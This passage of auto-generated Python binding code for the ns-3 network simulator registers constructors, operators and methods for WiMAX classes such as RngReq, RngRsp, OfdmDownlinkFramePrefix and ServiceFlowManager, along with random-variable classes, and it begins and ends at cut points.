cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_comparison_operator('<')
cls.add_binary_comparison_operator('>')
cls.add_inplace_numeric_operator('*=', param('ns3::int64x64_t const &', 'right'))
cls.add_inplace_numeric_operator('-=', param('ns3::int64x64_t const &', 'right'))
cls.add_inplace_numeric_operator('/=', param('ns3::int64x64_t const &', 'right'))
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('<=')
cls.add_binary_comparison_operator('==')
cls.add_binary_comparison_operator('>=')
cls.add_constructor([])
cls.add_constructor([param('double', 'v')])
cls.add_constructor([param('int', 'v')])
cls.add_constructor([param('long int', 'v')])
cls.add_constructor([param('long long int', 'v')])
cls.add_constructor([param('unsigned int', 'v')])
cls.add_constructor([param('long unsigned int', 'v')])
cls.add_constructor([param('long long unsigned int', 'v')])
cls.add_constructor([param('int64_t', 'hi'), param('uint64_t', 'lo')])
cls.add_constructor([param('ns3::int64x64_t const &', 'o')])
cls.add_method('GetDouble',
'double',
[],
is_const=True)
cls.add_method('GetHigh',
'int64_t',
[],
is_const=True)
cls.add_method('GetLow',
'uint64_t',
[],
is_const=True)
cls.add_method('Invert',
'ns3::int64x64_t',
[param('uint64_t', 'v')],
is_static=True)
cls.add_method('MulByInvert',
'void',
[param('ns3::int64x64_t const &', 'o')])
return
def register_Ns3SimpleOfdmSendParam_methods(root_module, cls):
cls.add_constructor([param('ns3::simpleOfdmSendParam const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::bvec const &', 'fecBlock'), param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm')])
cls.add_constructor([param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('GetBurst',
'ns3::Ptr< ns3::PacketBurst >',
[])
cls.add_method('GetBurstSize',
'uint32_t',
[])
cls.add_method('GetDirection',
'uint8_t',
[])
cls.add_method('GetFecBlock',
'ns3::bvec',
[])
cls.add_method('GetFrequency',
'uint64_t',
[])
cls.add_method('GetIsFirstBlock',
'bool',
[])
cls.add_method('GetModulationType',
'ns3::WimaxPhy::ModulationType',
[])
cls.add_method('GetRxPowerDbm',
'double',
[])
cls.add_method('SetBurstSize',
'void',
[param('uint32_t', 'burstSize')])
cls.add_method('SetDirection',
'void',
[param('uint8_t', 'direction')])
cls.add_method('SetFecBlock',
'void',
[param('ns3::bvec const &', 'fecBlock')])
cls.add_method('SetFrequency',
'void',
[param('uint64_t', 'Frequency')])
cls.add_method('SetIsFirstBlock',
'void',
[param('bool', 'isFirstBlock')])
cls.add_method('SetModulationType',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetRxPowerDbm',
'void',
[param('double', 'rxPowerDbm')])
return
def register_Ns3Chunk_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Chunk const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::ClassificationRuleVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::ClassificationRuleVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3ConstantVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ConstantVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'c')])
cls.add_method('SetConstant',
'void',
[param('double', 'c')])
return
def register_Ns3CsParamVectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::CsParamVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::CsParamVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3DeterministicVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::DeterministicVariable const &', 'arg0')])
cls.add_constructor([param('double *', 'd'), param('uint32_t', 'c')])
return
def register_Ns3EmpiricalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::EmpiricalVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CDF',
'void',
[param('double', 'v'), param('double', 'c')])
return
def register_Ns3ErlangVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ErlangVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('unsigned int', 'k'), param('double', 'lambda')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('unsigned int', 'k'), param('double', 'lambda')],
is_const=True)
return
def register_Ns3ExponentialVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ExponentialVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 'b')])
return
def register_Ns3GammaVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::GammaVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'alpha'), param('double', 'beta')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('double', 'alpha'), param('double', 'beta')],
is_const=True)
return
def register_Ns3Header_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Header const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3IntEmpiricalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::IntEmpiricalVariable const &', 'arg0')])
cls.add_constructor([])
return
def register_Ns3Ipv4AddressTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::Ipv4AddressTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('ns3::Ipv4Address', 'address'), param('ns3::Ipv4Mask', 'Mask')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ipv4AddressTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4AddressTlvValue::ipv4Addr const &', 'arg0')])
cls.add_instance_attribute('Address', 'ns3::Ipv4Address', is_const=False)
cls.add_instance_attribute('Mask', 'ns3::Ipv4Mask', is_const=False)
return
def register_Ns3LogNormalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::LogNormalVariable const &', 'arg0')])
cls.add_constructor([param('double', 'mu'), param('double', 'sigma')])
return
def register_Ns3MacHeaderType_methods(root_module, cls):
cls.add_constructor([param('ns3::MacHeaderType const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
return
def register_Ns3ManagementMessageType_methods(root_module, cls):
cls.add_constructor([param('ns3::ManagementMessageType const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
return
def register_Ns3NormalVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::NormalVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm'), param('double', 'v')])
cls.add_constructor([param('double', 'm'), param('double', 'v'), param('double', 'b')])
return
def register_Ns3Object_methods(root_module, cls):
cls.add_constructor([])
cls.add_method('AggregateObject',
'void',
[param('ns3::Ptr< ns3::Object >', 'other')])
cls.add_method('Dispose',
'void',
[])
cls.add_method('GetAggregateIterator',
'ns3::Object::AggregateIterator',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Start',
'void',
[])
cls.add_constructor([param('ns3::Object const &', 'o')],
visibility='protected')
cls.add_method('DoDispose',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('DoStart',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('NotifyNewAggregate',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectAggregateIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::Object::AggregateIterator const &', 'arg0')])
cls.add_constructor([])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::Ptr< ns3::Object const >',
[])
return
def register_Ns3OfdmDownlinkFramePrefix_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDownlinkFramePrefix const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlFramePrefixElement',
'void',
[param('ns3::DlFramePrefixIe', 'dlFramePrefixElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlFramePrefixElements',
'std::vector< ns3::DlFramePrefixIe >',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationId')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'configurationChangeCount')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
return
def register_Ns3OfdmSendParams_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmSendParams const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('uint8_t', 'modulationType'), param('uint8_t', 'direction')])
cls.add_method('GetBurst',
'ns3::Ptr< ns3::PacketBurst >',
[],
is_const=True)
cls.add_method('GetDirection',
'uint8_t',
[],
is_const=True)
cls.add_method('GetModulationType',
'uint8_t',
[],
is_const=True)
return
def register_Ns3OfdmUcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetSbchnlFocContCodes',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSbchnlReqRegionFullParams',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('SetSbchnlFocContCodes',
'void',
[param('uint8_t', 'sbchnlFocContCodes')])
cls.add_method('SetSbchnlReqRegionFullParams',
'void',
[param('uint8_t', 'sbchnlReqRegionFullParams')])
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3PacketBurst_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketBurst const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddPacket',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet')])
cls.add_method('Begin',
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::PacketBurst >',
[],
is_const=True)
cls.add_method('End',
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('GetNPackets',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPackets',
'std::list< ns3::Ptr< ns3::Packet > >',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3ParetoVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ParetoVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 's')])
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])
cls.add_constructor([param('std::pair< double, double >', 'params')])
cls.add_constructor([param('std::pair< double, double >', 'params'), param('double', 'b')])
return
def register_Ns3PcapFileWrapper_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('Fail',
'bool',
[],
is_const=True)
cls.add_method('Eof',
'bool',
[],
is_const=True)
cls.add_method('Clear',
'void',
[])
cls.add_method('Open',
'void',
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])
cls.add_method('Close',
'void',
[])
cls.add_method('Init',
'void',
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='std::numeric_limits<unsigned int>::max()'), param('int32_t', 'tzCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('ns3::Time', 't'), param('uint8_t const *', 'buffer'), param('uint32_t', 'length')])
cls.add_method('GetMagic',
'uint32_t',
[])
cls.add_method('GetVersionMajor',
'uint16_t',
[])
cls.add_method('GetVersionMinor',
'uint16_t',
[])
cls.add_method('GetTimeZoneOffset',
'int32_t',
[])
cls.add_method('GetSigFigs',
'uint32_t',
[])
cls.add_method('GetSnapLen',
'uint32_t',
[])
cls.add_method('GetDataLinkType',
'uint32_t',
[])
return
def register_Ns3PortRangeTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::PortRangeTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('uint16_t', 'portLow'), param('uint16_t', 'portHigh')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::PortRangeTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3PortRangeTlvValuePortRange_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PortRangeTlvValue::PortRange const &', 'arg0')])
cls.add_instance_attribute('PortHigh', 'uint16_t', is_const=False)
cls.add_instance_attribute('PortLow', 'uint16_t', is_const=False)
return
def register_Ns3PriorityUlJob_methods(root_module, cls):
cls.add_constructor([param('ns3::PriorityUlJob const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetPriority',
'int',
[])
cls.add_method('GetUlJob',
'ns3::Ptr< ns3::UlJob >',
[])
cls.add_method('SetPriority',
'void',
[param('int', 'priority')])
cls.add_method('SetUlJob',
'void',
[param('ns3::Ptr< ns3::UlJob >', 'job')])
return
def register_Ns3PropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetNext',
'void',
[param('ns3::Ptr< ns3::PropagationLossModel >', 'next')])
cls.add_method('CalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True)
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3ProtocolTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::ProtocolTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('uint8_t', 'protiocol')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::ProtocolTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3RandomPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3RangePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3RngReq_methods(root_module, cls):
cls.add_constructor([param('ns3::RngReq const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetRangingAnomalies',
'uint8_t',
[],
is_const=True)
cls.add_method('GetReqDlBurstProfile',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('PrintDebug',
'void',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetRangingAnomalies',
'void',
[param('uint8_t', 'rangingAnomalies')])
cls.add_method('SetReqDlBurstProfile',
'void',
[param('uint8_t', 'reqDlBurstProfile')])
return
def register_Ns3RngRsp_methods(root_module, cls):
cls.add_constructor([param('ns3::RngRsp const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetAasBdcastPermission',
'uint8_t',
[],
is_const=True)
cls.add_method('GetBasicCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDlFreqOverride',
'uint32_t',
[],
is_const=True)
cls.add_method('GetDlOperBurstProfile',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInitRangOppNumber',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetOffsetFreqAdjust',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPowerLevelAdjust',
'uint8_t',
[],
is_const=True)
cls.add_method('GetPrimaryCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetRangStatus',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangSubchnl',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTimingAdjust',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUlChnlIdOverride',
'uint8_t',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetAasBdcastPermission',
'void',
[param('uint8_t', 'aasBdcastPermission')])
cls.add_method('SetBasicCid',
'void',
[param('ns3::Cid', 'basicCid')])
cls.add_method('SetDlFreqOverride',
'void',
[param('uint32_t', 'dlFreqOverride')])
cls.add_method('SetDlOperBurstProfile',
'void',
[param('uint16_t', 'dlOperBurstProfile')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetInitRangOppNumber',
'void',
[param('uint8_t', 'initRangOppNumber')])
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetOffsetFreqAdjust',
'void',
[param('uint32_t', 'offsetFreqAdjust')])
cls.add_method('SetPowerLevelAdjust',
'void',
[param('uint8_t', 'powerLevelAdjust')])
cls.add_method('SetPrimaryCid',
'void',
[param('ns3::Cid', 'primaryCid')])
cls.add_method('SetRangStatus',
'void',
[param('uint8_t', 'rangStatus')])
cls.add_method('SetRangSubchnl',
'void',
[param('uint8_t', 'rangSubchnl')])
cls.add_method('SetTimingAdjust',
'void',
[param('uint32_t', 'timingAdjust')])
cls.add_method('SetUlChnlIdOverride',
'void',
[param('uint8_t', 'ulChnlIdOverride')])
return
def register_Ns3SSManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SSManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateSSRecord',
'ns3::SSRecord *',
[param('ns3::Mac48Address const &', 'macAddress')])
cls.add_method('DeleteSSRecord',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetNRegisteredSSs',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNSSs',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSSRecord',
'ns3::SSRecord *',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
cls.add_method('GetSSRecord',
'ns3::SSRecord *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetSSRecords',
'std::vector< ns3::SSRecord * > *',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsInRecord',
'bool',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
cls.add_method('IsRegistered',
'bool',
[param('ns3::Mac48Address const &', 'macAddress')],
is_const=True)
return
def register_Ns3ServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::ServiceFlowManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[param('std::vector< ns3::ServiceFlow * > *', 'serviceFlows')])
cls.add_method('AreServiceFlowsAllocated',
'bool',
[param('std::vector< ns3::ServiceFlow * >', 'serviceFlows')])
cls.add_method('DoClassify',
'ns3::ServiceFlow *',
[param('ns3::Ipv4Address', 'SrcAddress'), param('ns3::Ipv4Address', 'DstAddress'), param('uint16_t', 'SrcPort'), param('uint16_t', 'DstPort'), param('uint8_t', 'Proto'), param('ns3::ServiceFlow::Direction', 'dir')],
is_const=True)
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetNextServiceFlowToAllocate',
'ns3::ServiceFlow *',
[])
cls.add_method('GetNrServiceFlows',
'uint32_t',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('uint32_t', 'sfid')],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3SfVectorTlvValue_methods(root_module, cls):
